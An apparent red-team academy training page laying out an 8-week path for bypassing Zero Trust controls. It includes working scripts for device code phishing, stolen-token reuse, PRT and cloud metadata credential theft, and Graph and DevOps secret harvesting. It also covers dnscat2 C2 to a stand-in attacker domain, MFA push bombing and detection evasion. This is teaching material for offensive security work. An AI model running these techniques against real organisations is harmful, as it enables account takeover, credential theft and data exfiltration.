---
layout: training-page
title: "Zero Trust Bypass Path (8 Weeks) — Red Team Academy"
module: "Learning Paths"
tags:
  - zero-trust
  - learning-path
  - azure-ad
  - evasion
  - cloud
  - identity
  - conditional-access
page_key: "learning-paths-zero-trust-bypass"
render_with_liquid: false
---

# Zero Trust Bypass Path — 8 Weeks

Zero Trust Architecture (ZTA) is the dominant enterprise security model in modern organizations. Its core principle is "never trust, always verify" — every access request must be authenticated, authorized, and validated regardless of network location. As a red teamer, you must understand this model deeply, because your adversary simulation cannot succeed without bypassing the controls it imposes.

This path teaches how to attack organizations that have implemented Zero Trust frameworks — Microsoft's Entra ID / Azure AD, Conditional Access policies, Endpoint Detection and Response (EDR), and Cloud Access Security Brokers (CASB). This is an advanced path. Do not start here without solid AD attack and evasion fundamentals.

---

## Zero Trust Architecture Overview

Traditional security assumed the corporate network was trusted. VPN into the network = access to resources. Zero Trust eliminates that assumption.

**ZTA Control Pillars:**

| Pillar | Control | Attack Surface |
|---|---|---|
| Identity | MFA, Conditional Access, PIM | Device code phishing, token theft, MFA fatigue |
| Endpoint | MDM (Intune), EDR, device compliance | AMSI/ETW bypass, LOLBins, BOFs |
| Network | Microsegmentation, SD-WAN, DNS filtering | Pivoting through trusted channels, DNS C2 |
| Application | App-level auth, OAuth scopes, API policies | OAuth abuse, scope escalation |
| Data | DLP, sensitivity labels, RMS encryption | Access through legitimate identities |
| Infrastructure | Cloud IAM, JIT access, PIM roles | Cloud credential theft, managed identity abuse |

**Red team insight:** ZTA shifts the attack surface from the network to identity. Compromising an identity (via token theft, device code phishing, or MFA bypass) often grants more access than compromising a host.

---

## Prerequisites Checklist

- [ ] Strong Active Directory attack background (CRTO-level minimum)
- [ ] Familiar with Azure AD architecture: users, service principals, managed identities, app registrations
- [ ] Experience with AMSI bypass and basic EDR evasion
- [ ] Can operate Cobalt Strike or equivalent C2 in a Windows environment
- [ ] Understands OAuth 2.0 and OIDC authentication flows
- [ ] Has completed at least one full red team engagement or simulated exercise

---

## Week 1: Identity Is the New Perimeter

**Goal:** Understand Azure AD's attack surface and techniques for stealing, abusing, or forging authentication tokens.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/active-directory/azure-ad](/active-directory/azure-ad) | Azure AD architecture, Connect sync, Seamless SSO, PRT |
| [/active-directory/azure-credential-access](/active-directory/azure-credential-access) | Token theft, PRT extraction, FOCI abuse |
| [/active-directory/m365-attacks](/active-directory/m365-attacks) | Teams/Exchange/SharePoint data access via tokens |

### Azure AD Authentication Hierarchy

```
User Authenticates to Azure AD
          ↓
    Primary Refresh Token (PRT)
    Issued to Windows device
    Contains: user identity + device compliance claim
          ↓
    Access Token (1 hour TTL)
    Resource-specific (Graph, SharePoint, etc.)
    Can be extracted and replayed
          ↓
    Refresh Token (90 days TTL)
    Used to get new access tokens
    Family of Client IDs (FOCI) allows cross-app reuse
```

### Primary Refresh Token (PRT) Attack

PRT is stored on Entra-joined/hybrid-joined devices. It is the most valuable credential in a Zero Trust environment because it contains both user identity and device compliance claims.

```powershell
# Request PRT via AADInternals
Import-Module AADInternals
# Get PRT from current Windows session
$prt = Get-AADIntUserPRTToken
# Use PRT to get access tokens
Get-AADIntAccessTokenForMSGraph -PRTToken $prt

# From Cobalt Strike (if on a domain-joined machine):
# Use the PRT stealing techniques via BOF or execute-assembly
execute-assembly /opt/ROADtoken/ROADtoken.exe
```

### Family of Client IDs (FOCI) Token Theft

Microsoft uses token families where a refresh token from one app (e.g., Teams) works for other Microsoft apps (e.g., Outlook, SharePoint). This is called FOCI.

```python
# If you steal a refresh token from one Microsoft app:
# Test if it works for other apps via token refresh
import requests

refresh_token = "<stolen_token>"
client_ids = {
    "Teams": "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
    "OneDrive": "ab9b8c07-8f02-4f72-87fa-80105867a763", 
    "Outlook": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
    "Azure CLI": "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
}

for app_name, client_id in client_ids.items():
    r = requests.post("https://login.microsoftonline.com/common/oauth2/v2.0/token", data={
        "grant_type": "refresh_token",
        "refresh_token": refresh_token,
        "client_id": client_id,
        "scope": "openid profile"
    })
    if r.status_code == 200:
        print(f"[+] {app_name}: Token works!")
```

---

## Week 2: Conditional Access Bypass

**Goal:** Understand and bypass Conditional Access policies that enforce MFA, device compliance, and location-based restrictions.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/active-directory/azure-defense-evasion](/active-directory/azure-defense-evasion) | UEBA evasion, conditional access bypass, token replay |
| [/exploitation/device-code-phishing](/exploitation/device-code-phishing) | Device code flow abuse to steal tokens without MFA |

### Common Conditional Access Policies and Bypass Approaches

| CA Policy | What It Enforces | Bypass Approach |
|---|---|---|
| Require MFA | MFA on every login | Device code phishing (MFA already satisfied by flow) |
| Compliant device required | Only Intune-compliant devices | PRT theft from compliant device |
| Trusted locations only | Named IP ranges | VPN/proxy to match named location |
| Block legacy auth | No basic auth | Not a bypass target — legacy auth is dead |
| Sign-in risk threshold | Risky sign-ins blocked | Operate from same IP as victim (implant on their machine) |
| User risk threshold | Risky user behavior blocked | Maintain low UEBA score by blending in |

### Device Code Phishing

Device code phishing abuses the OAuth 2.0 device authorization grant flow. The user authenticates (including MFA) via a device code, and the attacker receives the resulting token.

```python
# Step 1: Request device code
import requests

r = requests.post("https://login.microsoftonline.com/common/oauth2/v2.0/devicecode", data={
    "client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Microsoft Office client ID
    "scope": "https://graph.microsoft.com/.default offline_access openid"
})
device_code_response = r.json()
print(f"[*] Phishing URL: {device_code_response['verification_uri']}")
print(f"[*] Code to send victim: {device_code_response['user_code']}")
# Send victim: "Please go to https://microsoft.com/devicelogin and enter code: XXXXXX"

# Step 2: Poll for token (victim completes MFA, you get the token)
import time
while True:
    token_r = requests.post("https://login.microsoftonline.com/common/oauth2/v2.0/token", data={
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
        "client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        "device_code": device_code_response['device_code']
    })
    if "access_token" in token_r.json():
        print("[+] Got token!")
        print(token_r.json()['refresh_token'])
        break
    time.sleep(5)
```

### MFA Fatigue (Push Bombing)

MFA fatigue attacks spam the user with MFA push requests until they accept out of frustration or confusion.

**Execution:**
1. Obtain valid credentials (password spray or credential stuffing)
2. Trigger repeated sign-in attempts
3. Each attempt generates an MFA push notification
4. Wait for the user to accept (most users accept within 10–15 requests)

**Detection evasion:** Space out requests to avoid account lockout and UEBA triggers. Monitor for "MFA fatigue detected" alerts in the tenant.

---

## Week 3: Endpoint Bypass

**Goal:** Deliver and execute payloads on endpoints protected by Microsoft Defender for Endpoint, CrowdStrike, or Intune policy.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/evasion/amsi-bypass](/evasion/amsi-bypass) | All AMSI bypass techniques |
| [/evasion/av-edr-evasion](/evasion/av-edr-evasion) | EDR hook removal, syscall-based evasion, memory protection bypass |
| [/exploitation/shellcode-loaders](/exploitation/shellcode-loaders) | Custom loaders, process injection, encryption at rest |
| [/exploitation/indirect-syscalls](/exploitation/indirect-syscalls) | Syscall-based evasion, Hell's Gate, Syswhispers |

### Zero Trust Endpoint Controls

| Control | Product | Red Team Bypass |
|---|---|---|
| Memory scanning | MDE, CrowdStrike | Encrypted shellcode, reflective loading, sleep obfuscation |
| Behavior detection | SentinelOne, Carbon Black | LOLBins, DCOM, COM hijacking |
| Script blocking | AMSI + Defender | AMSI bypass via BOF or obfuscation |
| ASR rules | Microsoft Defender | Block: office child processes, LOLBins from email |
| Tamper protection | MDE | Cannot disable Defender without admin + special procedure |
| Network indicators | Defender for Endpoint | Use HTTPS with CDN fronting |
| App control | Intune, WDAC | Bypass via trusted binary abuse |

### Indirect Syscalls for EDR Bypass

Most EDR products hook Windows API functions in ntdll.dll to monitor calls. Indirect syscalls bypass these hooks by calling the kernel directly.

```cpp
// Traditional API call (HOOKED by EDR):
NtAllocateVirtualMemory(hProcess, &addr, 0, &size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);

// Indirect syscall (bypasses userland hooks):
// Use Syswhispers3 or similar to generate syscall stubs
// Stub finds SSN (syscall number) dynamically from ntdll
// Calls kernel directly via syscall instruction
// EDR hook in ntdll is never reached
```

**Tools:** Syswhispers3, Hell's Gate, Tartarus Gate, FreshyCalls

### WDAC (Windows Defender Application Control) Bypass

WDAC blocks unsigned or untrusted executables. Bypass approaches:
1. **BYOVD (Bring Your Own Vulnerable Driver)** — load a legitimate but vulnerable driver signed by Microsoft, exploit it to disable WDAC
2. **Trusted binary abuse** — execute via a WDAC-trusted binary (LOLBin)
3. **MSI installer** — some WDAC policies allow MSI installers

---

## Week 4: Network Segmentation Bypass

**Goal:** Move through a microsegmented network using approved protocols and cloud-native egress paths.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/pivoting/ssh-tunneling](/pivoting/ssh-tunneling) | Dynamic SOCKS proxy, local/remote forwarding, jump hosts |
| [/pivoting/chisel](/pivoting/chisel) | HTTP-based tunneling, Chisel SOCKS5, reverse tunnels |
| [/infrastructure/cdn-fronting](/infrastructure/cdn-fronting) | Domain fronting via CDN, cloud fronting for C2 |

### Microsegmentation Reality

Modern Zero Trust implementations use microsegmentation to restrict east-west traffic. Even within the corporate network, machine-to-machine communication requires explicit policy allowance.

**What's usually allowed (attack opportunities):**
- Web traffic (80/443) to internet — use for C2 egress
- DNS to internal resolvers — use for DNS C2 in restrictive environments
- SMB within segments (for file shares) — use for lateral movement
- WinRM/RDP to management jump hosts
- HTTPS to cloud services (M365, Azure) — use for cloud C2 or data exfil

### CDN Fronting for C2

Domain fronting uses a CDN to route C2 traffic. The network sees traffic going to a legitimate CDN (cloudflare.com, azureedge.net), while the actual destination is your team server.

```
Target Machine
    ↓ HTTPS to cdn.cloudflare.com (passes firewall)
Cloudflare CDN
    ↓ Routes based on Host header (your domain)
Your Team Server
```

**Implementation with Cobalt Strike:**
- Register a domain on Cloudflare
- Configure Cloudflare to proxy to your team server
- Malleable C2 profile: set `Host` header to your domain
- The firewall sees Cloudflare IP, not your team server

### DNS-Based C2 in Highly Restricted Environments

When only DNS is allowed outbound:
```bash
# Configure dnscat2 server
ruby dnscat2.rb --dns "domain=c2.attacker.com"

# Client (target):
dnscat --dns "domain=c2.attacker.com,server=<DNS_server_IP>"

# In Cobalt Strike: DNS listener
# Requires a domain with NS records pointing to your server
```

---

## Week 5: Cloud Lateral Movement

**Goal:** Move laterally within cloud environments using compromised identity tokens and cloud-native privilege escalation.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/cloud/aws-attacks](/cloud/aws-attacks) | AWS IAM abuse, EC2 metadata service, role chaining |
| [/cloud/kubernetes-security](/cloud/kubernetes-security) | Kubernetes RBAC escape, service account abuse |
| [/active-directory/azure-lateral-movement](/active-directory/azure-lateral-movement) | Azure VM lateral movement, managed identity abuse, ARC |

### Azure Managed Identity Abuse

Managed identities provide Azure resources with an Azure AD identity without explicit credentials. If you compromise an Azure VM, you can steal its managed identity token from the IMDS endpoint:

```bash
# From inside an Azure VM
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | python3 -m json.tool

# Extract access_token and use with Azure REST API
TOKEN="<extracted_token>"
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"
```

### AWS IMDSv1 vs IMDSv2

IMDSv1 (no token required — just curl the metadata URL):
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>
# Returns: AccessKeyId, SecretAccessKey, Token (temporary credentials)
```

IMDSv2 (token-required — enabled by default on modern instances):
```bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

---

## Week 6: SaaS Exploitation

**Goal:** Use compromised M365/Google Workspace access to gather intelligence, escalate, and exfiltrate data.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/post-exploitation/saas-workspace](/post-exploitation/saas-workspace) | M365 and Google Workspace data collection, Teams abuse |
| [/active-directory/azure-services-abuse](/active-directory/azure-services-abuse) | Azure DevOps secrets, Logic Apps, Automation Accounts |

### M365 Post-Compromise Intelligence

Once you have a valid access token (via device code phishing or PRT theft):

```python
import requests

headers = {"Authorization": f"Bearer {access_token}"}

# Enumerate emails (Outlook)
r = requests.get("https://graph.microsoft.com/v1.0/me/messages?$top=10&$orderby=receivedDateTime desc", headers=headers)

# Get all SharePoint sites
r = requests.get("https://graph.microsoft.com/v1.0/sites?search=*", headers=headers)

# Get Teams messages
r = requests.get("https://graph.microsoft.com/v1.0/me/joinedTeams", headers=headers)

# Get OneDrive files
r = requests.get("https://graph.microsoft.com/v1.0/me/drive/root/children", headers=headers)

# Enumerate other users (if Graph permissions allow)
r = requests.get("https://graph.microsoft.com/v1.0/users", headers=headers)
```

### Azure DevOps Secret Harvesting

If the compromised user has Azure DevOps access:
```bash
# List organizations
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://app.vssps.visualstudio.com/_apis/accounts?api-version=7.0"

# List pipelines (may contain secrets in variables)
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://dev.azure.com/{org}/{project}/_apis/pipelines?api-version=7.0"

# Get pipeline YAML (may contain hardcoded secrets)
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://dev.azure.com/{org}/{project}/_apis/build/definitions/{id}?api-version=7.0"
```

---

## Week 7: Evasion from Telemetry-Heavy Environments

**Goal:** Operate in environments with heavy telemetry (Sentinel, Defender XDR, Splunk) without triggering analytics rules.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/exploitation/sandbox-evasion](/exploitation/sandbox-evasion) | Environment checks, timing attacks, VM detection |
| [/evasion/sleep-obfuscation](/evasion/sleep-obfuscation) | In-memory beacon encryption during sleep, Ekko, Foliage |

### UEBA (User Entity Behavior Analytics) Evasion

Modern SIEM platforms use UEBA to detect anomalous behavior. Common detections and bypass approaches:

| UEBA Detection | Trigger | Bypass |
|---|---|---|
| Impossible travel | Login from two geographies simultaneously | Use proxy near victim's location |
| Off-hours login | Login at 3 AM from unknown device | Operate during business hours |
| Mass data access | Downloading 10,000 files in 10 minutes | Slow exfil — 10-20 files/hour |
| New device sign-in | First sign-in from unknown device | Use PRT from existing compliant device |
| Admin role activation | PIM role activation | Use standing access paths; avoid PIM if possible |
| Unusual Graph API queries | Bulk /users or /groups enumeration | Enumerate in small batches with delays |

### BOF-Based Post-Exploitation (OPSEC-Safe)

BOFs (Beacon Object Files) execute within the Cobalt Strike beacon process itself. No new process = less telemetry. Replace common post-exploitation with BOF equivalents:

| Traditional | BOF Alternative | Why Better |
|---|---|---|
| Mimikatz.exe | nanodump BOF + offline parse | No mimikatz.exe on disk |
| net user /domain | LDAP BOF enumeration | No net.exe execution |
| nltest /dclist | LdapSearch BOF | No nltest.exe |
| cmd.exe /c ipconfig | inject shellcode to notepad | No cmd.exe spawned |
| Invoke-BloodHound | BOF collection | No PowerShell process |

---

## Week 8: Full Zero Trust Simulation

**Goal:** Run a complete end-to-end zero trust bypass simulation from external phishing to cloud data exfiltration.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/scenarios/apt29-financial](/scenarios/apt29-financial) | APT29-style attack chain with modern ZT-heavy target |

### Full Attack Chain: ZTA Bypass

```
Phase 1: Initial Access (Identity-based)
  → Device code phishing email → victim authenticates → steal refresh token
  → Use FOCI to gain access to M365, Teams, SharePoint
  → Gather credentials from Teams messages and SharePoint files

Phase 2: Endpoint Compromise (if needed)
  → Use gathered credentials to deliver payload via Teams/email
  → Payload uses indirect syscalls + encrypted shellcode
  → Beacon establishes HTTPS C2 via CDN-fronted domain
  → AMSI bypass via BOF before any PowerShell

Phase 3: Privilege Escalation
  → Enumerate Azure AD roles of compromised account
  → Check for PIM eligible roles (activate if possible)
  → Steal PRT from compromised endpoint for higher-privilege access
  → DCSync or AAD Connect abuse for full credential harvest

Phase 4: Cloud Lateral Movement
  → Use M365 token to enumerate all files, emails, Teams channels
  → Identify Azure subscriptions accessible to compromised identity
  → Abuse managed identities on accessible VMs
  → Check Azure DevOps for pipeline secrets

Phase 5: Data Collection and Exfil
  → Exfil via Microsoft Graph API (looks like legitimate M365 traffic)
  → Or: package data and exfil via HTTPS to CDN-fronted server
  → Slow exfil to avoid DLP triggers (rate-limited)
```

### Pre-Simulation Checklist

- [ ] C2 infrastructure ready (CDN-fronted HTTPS listener)
- [ ] Device code phishing script configured for target tenant
- [ ] AADInternals, ROADtools, GraphRunner ready
- [ ] BOF collection loaded in Cobalt Strike
- [ ] Indirect syscalls shellcode loader compiled and tested
- [ ] Azure CLI and az PowerShell module ready for cloud movement
- [ ] Operations log template ready for documentation

---

## Zero Trust Bypass Resources

| Resource | Type | Notes |
|---|---|---|
| Microsoft Identity Attack Research (MIAR) | Blog | Microsoft's own research on identity attacks |
| AADInternals documentation | Tool reference | Dr. Nestori Syynimaa's Azure AD toolkit |
| ROADtools | GitHub | Azure AD recon and post-exploitation |
| GraphRunner | GitHub | Microsoft Graph API post-exploitation |
| Mandiant Azure AD Attack Techniques | Research paper | Comprehensive Azure AD attack taxonomy |
| SpecterOps BloodHound Enterprise | Product/research | Azure attack path research |
| Black Hat talks on Zero Trust bypasses | Conference | Search "zero trust bypass" in Black Hat archive |
| SANS Cloud Security Summit | Conference | Cloud-focused red team techniques |
